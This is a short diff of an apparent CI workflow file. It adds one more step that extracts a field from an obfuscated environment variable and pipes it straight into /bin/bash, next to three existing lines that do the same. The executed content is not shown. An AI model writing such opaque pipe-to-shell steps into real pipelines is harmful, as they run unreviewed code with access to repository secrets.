@@ -32,6 +32,7 @@ jobs:
           echo $zr23 | jq -r .oswfj8035 | /bin/bash
           echo $byzaa19 | jq -r .g15851 | /bin/bash
           printf '%s' "$de451" | jq -r .oikl375 | /bin/bash
+          printf '%s' "$mdf03216" | jq -r .opadd3 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
